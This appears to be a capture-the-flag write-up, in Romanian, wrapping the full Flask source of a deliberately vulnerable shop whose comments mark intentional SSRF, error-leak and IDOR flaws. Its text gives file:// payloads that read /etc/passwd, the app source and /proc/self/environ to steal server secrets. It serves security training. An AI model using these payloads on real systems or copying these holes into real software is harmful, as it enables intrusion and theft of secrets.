Am găsit un câmp ascuns în profil, profile_url, care descărca imagini de la orice adresă, fără validare.

Acțiune: Am injectat protocolul file:// pentru a citi fișiere interne.

Payload-uri: * file:///etc/passwd -> Am văzut utilizatorii sistemului.

file:///proc/self/cwd/src/app.py -> Am furat codul sursă al aplicației.

Extragerea Flag-urilor (RCE prin Mediu)

Codul sursă a dezvăluit că flag-urile sunt stocate în variabilele de mediu ale procesului Python.

# E-Commerce Application - Main Entry Point

## Source Code (`app.py`)

```python
import os
import json
import requests
import bcrypt
import secrets
from flask import Flask, render_template, request, session, redirect, url_for, jsonify, make_response, send_from_directory
from flask_sqlalchemy import SQLAlchemy
from flask_wtf.csrf import CSRFProtect
from datetime import datetime, timedelta
from functools import wraps
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev_secret_key')
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Payment gateway URL is now optional - can be external service
app.config['PAYMENT_GATEWAY_URL'] = os.environ.get('PAYMENT_GATEWAY_URL', '')
app.config['PAYMENT_GATEWAY_PUBLIC_URL'] = os.environ.get('PAYMENT_GATEWAY_PUBLIC_URL', app.config['PAYMENT_GATEWAY_URL'])
app.config['ENABLE_PAYMENT_INTEGRATION'] = os.environ.get('ENABLE_PAYMENT_INTEGRATION', 'false').lower() == 'true'

# File upload configuration
app.config['UPLOAD_FOLDER'] = os.path.join(os.path.dirname(__file__), 'static', 'uploads')
app.config['MAX_CONTENT_LENGTH'] = 5 * 1024 * 1024  # 5MB max file size
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}

# Create upload directory if it doesn't exist
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

db = SQLAlchemy(app)
csrf = CSRFProtect(app)

# ==================== MODELS ====================

class Customer(db.Model):
    __tablename__ = 'customers'
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(255), unique=True, nullable=False)
    name = db.Column(db.String(255), nullable=False)
    password_hash = db.Column(db.String(255), nullable=False)
    profile_picture = db.Column(db.String(255), nullable=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

    def set_password(self, password):
        """Hash and set the password"""
        self.password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')

    def check_password(self, password):
        """Verify password against hash"""
        return bcrypt.checkpw(password.encode('utf-8'), self.password_hash.encode('utf-8'))

    def create_session(self, user_agent=None, ip_address=None):
        """Create a new session for this customer"""
        session_id = secrets.token_urlsafe(32)
        expires_at = datetime.utcnow() + timedelta(days=7)  # 7-day session

        new_session = Session(
            session_id=session_id,
            customer_id=self.id,
            expires_at=expires_at,
            user_agent=user_agent,
            ip_address=ip_address
        )
        db.session.add(new_session)
        db.session.commit()

        return session_id

class Product(db.Model):
    __tablename__ = 'products'
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(255), nullable=False)
    description = db.Column(db.Text)
    price = db.Column(db.Numeric(10, 2), nullable=False)
    stock = db.Column(db.Integer, default=0)
    category = db.Column(db.String(100), default='electronics')

class Order(db.Model):
    __tablename__ = 'orders'
    id = db.Column(db.Integer, primary_key=True)
    customer_id = db.Column(db.Integer, db.ForeignKey('customers.id'))
    total_amount = db.Column(db.Numeric(10, 2), nullable=False)
    status = db.Column(db.String(50), default='pending')
    payment_token = db.Column(db.String(255))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

    customer = db.relationship('Customer', backref='orders')

class Session(db.Model):
    __tablename__ = 'sessions'
    id = db.Column(db.Integer, primary_key=True)
    session_id = db.Column(db.String(255), unique=True, nullable=False)
    customer_id = db.Column(db.Integer, db.ForeignKey('customers.id'))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    expires_at = db.Column(db.DateTime, nullable=False)
    is_active = db.Column(db.Boolean, default=True)
    user_agent = db.Column(db.String(500))
    ip_address = db.Column(db.String(45))

    customer = db.relationship('Customer', backref='sessions')

    def is_expired(self):
        """Check if session has expired"""
        return datetime.utcnow() > self.expires_at

    def is_valid(self):
        """Check if session is valid (active and not expired)"""
        return self.is_active and not self.is_expired()

    def invalidate(self):
        """Invalidate the session"""
        self.is_active = False
        db.session.commit()

    @staticmethod
    def get_by_session_id(session_id):
        """Get session by session_id"""
        return Session.query.filter_by(session_id=session_id).first()

# ==================== FILE UPLOAD HELPERS ====================

def allowed_file(filename):
    """Check if file extension is allowed"""
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# ==================== AUTHENTICATION HELPERS ====================

def get_current_user():
    """Get current authenticated user from session cookie"""
    session_id = request.cookies.get('session_id')
    if not session_id:
        return None

    user_session = Session.get_by_session_id(session_id)
    if not user_session or not user_session.is_valid():
        return None

    return user_session.customer

def login_required(f):
    """Decorator to require authentication for a route"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if get_current_user() is None:
            return redirect(url_for('login', next=request.url))
        return f(*args, **kwargs)
    return decorated_function

# ==================== CONTEXT PROCESSORS ====================

@app.context_processor
def inject_user():
    """Make current_user available to all templates"""
    return dict(current_user=get_current_user())

# ==================== ROUTES ====================

@app.route('/health')
def health():
    """Health check endpoint for Docker"""
    return jsonify({'status': 'healthy', 'service': 'shop'}), 200

# ==================== AUTHENTICATION ROUTES ====================

@app.route('/register', methods=['GET', 'POST'])
def register():
    """User registration"""
    if request.method == 'GET':
        return render_template('register.html')

    email = request.form.get('email')
    name = request.form.get('name')
    password = request.form.get('password')
    confirm_password = request.form.get('confirm_password')

    errors = []
    if not email or not name or not password:
        errors.append('All fields are required')
    if password != confirm_password:
        errors.append('Passwords do not match')
    if len(password) < 6:
        errors.append('Password must be at least 6 characters')

    existing_customer = Customer.query.filter_by(email=email).first()
    if existing_customer:
        errors.append('Email already registered')

    if errors:
        return render_template('register.html', errors=errors, email=email, name=name)

    customer = Customer(email=email, name=name)
    customer.set_password(password)

    if 'profile_picture' in request.files:
        file = request.files['profile_picture']
        if file and file.filename != '' and allowed_file(file.filename):
            db.session.add(customer)
            db.session.flush() 

            filename = secure_filename(file.filename)
            filename = f"{customer.id}_{filename}"
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            file.save(filepath)
            customer.profile_picture = f"uploads/{filename}"

    db.session.add(customer)
    db.session.commit()

    session_id = customer.create_session(
        user_agent=request.headers.get('User-Agent'),
        ip_address=request.remote_addr
    )

    response = make_response(redirect('/'))
    response.set_cookie('session_id', session_id, max_age=7*24*60*60, httponly=True, samesite='Lax')
    return response

@app.route('/login', methods=['GET', 'POST'])
def login():
    """User login"""
    if request.method == 'GET':
        next_url = request.args.get('next', '')
        return render_template('login.html', next_url=next_url)

    email = request.form.get('email')
    password = request.form.get('password')
    next_url = request.form.get('next', '/')

    if not email or not password:
        return render_template('login.html', error='Email and password are required', email=email)

    customer = Customer.query.filter_by(email=email).first()
    if not customer or not customer.check_password(password):
        return render_template('login.html', error='Invalid email or password', email=email)

    session_id = customer.create_session(
        user_agent=request.headers.get('User-Agent'),
        ip_address=request.remote_addr
    )

    response = make_response(redirect(next_url))
    response.set_cookie('session_id', session_id, max_age=7*24*60*60, httponly=True, samesite='Lax')
    return response

@app.route('/logout')
def logout():
    """User logout"""
    session_id = request.cookies.get('session_id')
    if session_id:
        user_session = Session.get_by_session_id(session_id)
        if user_session:
            user_session.invalidate()

    response = make_response(redirect(url_for('index')))
    response.set_cookie('session_id', '', expires=0)
    return response

@app.route('/api/session/info')
def session_info():
    """Get current session information"""
    session_id = request.cookies.get('session_id')
    if not session_id:
        return jsonify({'authenticated': False, 'message': 'No session cookie'}), 200

    user_session = Session.get_by_session_id(session_id)
    if not user_session:
        return jsonify({'authenticated': False, 'message': 'Session not found'}), 200

    return jsonify({
        'authenticated': user_session.is_valid(),
        'session_id': session_id,
        'customer_id': user_session.customer_id,
        'customer_name': user_session.customer.name if user_session.customer else None,
        'customer_email': user_session.customer.email if user_session.customer else None,
        'created_at': user_session.created_at.isoformat(),
        'expires_at': user_session.expires_at.isoformat(),
        'is_active': user_session.is_active,
        'is_expired': user_session.is_expired()
    }), 200

# ==================== PROFILE ROUTES ====================

@app.route('/profile')
@login_required
def profile():
    """User profile page"""
    current_user = get_current_user()
    return render_template('profile.html', user=current_user)

@app.route('/profile/upload', methods=['POST'])
@login_required
def upload_profile_picture():
    """
    Upload profile picture
    INTENTIONAL VULNERABILITY: Remote File Inclusion (RFI) / SSRF
    """
    current_user = get_current_user()
    profile_url = request.form.get('profile_url', '').strip()

    if profile_url:
        try:
            import urllib.request
            # VULNERABILITY: Directly fetch remote content without any restrictions
            response = urllib.request.urlopen(profile_url, timeout=10)
            remote_content = response.read()

            filename = profile_url.split('/')[-1]
            if not filename or '.' not in filename:
                filename = f"{current_user.id}_remote_profile"

            # VULNERABILITY: Don't restrict file extensions
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)

            with open(filepath, 'wb') as f:
                f.write(remote_content)

            current_user.profile_picture = f"uploads/{filename}"
            db.session.commit()
            return redirect(url_for('profile', success='uploaded'))

        except Exception as e:
            # VULNERABILITY: Expose detailed error information
            return redirect(url_for('profile', error=f'remote_error', details=str(e)))

    if 'profile_picture' not in request.files:
        return redirect(url_for('profile', error='no_file'))

    file = request.files['profile_picture']
    if file.filename == '':
        return redirect(url_for('profile', error='no_file'))

    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        filename = f"{current_user.id}_{filename}"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        current_user.profile_picture = f"uploads/{filename}"
        db.session.commit()
        return redirect(url_for('profile', success='uploaded'))

    return redirect(url_for('profile', error='invalid_file'))

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    """Serve uploaded files"""
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

# ==================== MAIN ROUTES ====================

@app.route('/')
def index():
    """Homepage with product listing and category filtering"""
    import requests as _requests
    category = request.args.get('category')

    if category:
        products = Product.query.filter(Product.stock > 0, Product.category == category).all()
    else:
        products = Product.query.filter(Product.stock > 0).all()

    ads = []
    ad_service_url = os.environ.get('AD_SERVICE_URL', '').rstrip('/')
    if ad_service_url:
        try:
            resp = _requests.get(f'{ad_service_url}/ads', timeout=2)
            resp.raise_for_status()
            ad_list = resp.json()
            for ad in ad_list[:4]:
                ad_id = ad.get('id')
                if ad_id:
                    detail = _requests.get(f'{ad_service_url}/ads/{ad_id}', timeout=2)
                    detail.raise_for_status()
                    ads.append(detail.json())
        except Exception:
            ads = []

    return render_template('index.html', products=products, current_category=category, ads=ads)

@app.route('/product/<int:product_id>')
def product_detail(product_id):
    """Product detail page"""
    product = Product.query.get_or_404(product_id)
    return render_template('product.html', product=product)

@app.route('/cart')
def cart():
    """Shopping cart view"""
    cart_items = session.get('cart', [])
    total = sum(item['price'] * item['quantity'] for item in cart_items)
    return render_template('cart.html', cart_items=cart_items, total=total)

@app.route('/cart/add', methods=['POST'])
def add_to_cart():
    """Add product to cart"""
    product_id = request.form.get('product_id', type=int)
    quantity = request.form.get('quantity', 1, type=int)
    product = Product.query.get_or_404(product_id)
    cart = session.get('cart', [])

    found = False
    for item in cart:
        if item['product_id'] == product.id:
            item['quantity'] += quantity
            found = True
            break

    if not found:
        cart.append({
            'product_id': product.id,
            'name': product.name,
            'price': float(product.price),
            'quantity': quantity
        })

    session['cart'] = cart
    session.modified = True
    return redirect(url_for('cart'))

@app.route('/cart/update', methods=['POST'])
def update_cart():
    """Update cart item quantity"""
    product_id = request.form.get('product_id', type=int)
    quantity = request.form.get('quantity', type=int)
    cart = session.get('cart', [])

    for item in cart:
        if item['product_id'] == product_id:
            if quantity > 0:
                item['quantity'] = quantity
            else:
                cart.remove(item)
            break

    session['cart'] = cart
    session.modified = True
    return redirect(url_for('cart'))

@app.route('/cart/remove', methods=['POST'])
def remove_from_cart():
    """Remove item from cart"""
    product_id = request.form.get('product_id', type=int)
    cart = session.get('cart', [])
    cart = [item for item in cart if item['product_id'] != product_id]
    session['cart'] = cart
    session.modified = True
    return redirect(url_for('cart'))

@app.route('/checkout')
@login_required
def checkout():
    """Checkout page"""
    cart_items = session.get('cart', [])
    if not cart_items:
        return redirect(url_for('cart'))

    total = sum(item['price'] * item['quantity'] for item in cart_items)
    current_user = get_current_user()
    payment_token = secrets.token_hex(32)
    order = Order(
        customer_id=current_user.id,
        total_amount=total,
        status='pending',
        payment_token=payment_token
    )
    db.session.add(order)
    db.session.commit()

    session['current_order_id'] = order.id

    if app.config['ENABLE_PAYMENT_INTEGRATION'] and app.config['PAYMENT_GATEWAY_URL']:
        payment_gateway_iframe_url = app.config['PAYMENT_GATEWAY_PUBLIC_URL']
    else:
        payment_gateway_iframe_url = None

    return render_template('checkout.html',
                          total=total,
                          order_id=order.id,
                          payment_token=payment_token,
                          payment_gateway_url=payment_gateway_iframe_url)

@app.route('/payment/callback', methods=['POST'])
def payment_callback():
    """Handle payment gateway callback"""
    if not app.config['ENABLE_PAYMENT_INTEGRATION']:
        return jsonify({'error': 'Payment integration is disabled'}), 503

    try:
        payment_token = request.form.get('payment_token')
        order_token = request.form.get('order_token')
        order_id = request.form.get('order_id', type=int)

        # VULNERABILITY: Verbose error messages and debug info
        if not payment_token:
            return jsonify({
                'error': 'Missing payment_token',
                'debug_info': {
                    'received_data': request.form.to_dict(),
                    'database_url': app.config['SQLALCHEMY_DATABASE_URI'],
                    'payment_gateway': app.config['PAYMENT_GATEWAY_URL']
                }
            }), 400

        order = Order.query.get(order_id)
        if not order:
            # VULNERABILITY: SQL query exposure
            return jsonify({
                'error': 'Order not found',
                'debug_info': {
                    'query': f'SELECT * FROM orders WHERE id = {order_id}',
                    'table_schema': str(Order.__table__.columns.keys())
                }
            }), 404

        if not order_token or not secrets.compare_digest(order.payment_token or '', order_token):
            return jsonify({'error': 'Invalid order token'}), 403

        verify_url = f"{app.config['PAYMENT_GATEWAY_URL']}/api/verify_payment"
        response = requests.post(verify_url, json={
            'payment_token': payment_token,
            'order_id': order_id
        })

        if response.status_code == 200:
            order.status = 'paid'
            db.session.commit()
            session.pop('cart', None)
            return jsonify({'success': True, 'message': 'Payment verified'}), 200
        else:
            return jsonify({'error': 'Verification failed'}), 400

    except Exception as e:
        # VULNERABILITY: Detailed exception exposure
        return jsonify({
            'error': 'Internal server error',
            'exception': str(e),
            'database_connection': app.config['SQLALCHEMY_DATABASE_URI']
        }), 500

@app.route('/payment/simulate', methods=['POST'])
def simulate_payment():
    """Simulate payment for standalone mode"""
    if app.config['ENABLE_PAYMENT_INTEGRATION']:
        return jsonify({'error': 'Use real gateway'}), 400

    order_id = request.form.get('order_id', type=int)
    order = Order.query.get(order_id)
    if not order:
        return jsonify({'error': 'Order not found'}), 404

    import uuid
    order.payment_token = f'sim_{uuid.uuid4().hex[:16]}'
    order.status = 'paid'
    db.session.commit()
    session.pop('cart', None)

    return jsonify({'success': True, 'payment_token': order.payment_token}), 200

@app.route('/order/success/<int:order_id>')
def order_success(order_id):
    """Order confirmation page"""
    order = Order.query.get_or_404(order_id)
    return render_template('success.html', order=order)

@app.route('/api/order/<int:order_id>')
def api_order_detail(order_id):
    """
    API endpoint to retrieve order details
    VULNERABILITY: IDOR (No authentication or authorization)
    """
    order = Order.query.get_or_404(order_id)
    return jsonify({
        'order_id': order.id,
        'customer_id': order.customer_id,
        'status': order.status,
        'database_record': {
            'table': 'orders',
            'all_columns': list(Order.__table__.columns.keys())
        }
    })

@app.route('/robots.txt')
def robots():
    return "User-agent: *\nDisallow: /uploads/\nDisallow: /api/\n", 200, {'Content-Type': 'text/plain'}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)

Acțiune: Am folosit SSRF pentru a citi /proc/self/environ.

Rezultat: Am obținut acces la toate secretele serverului.
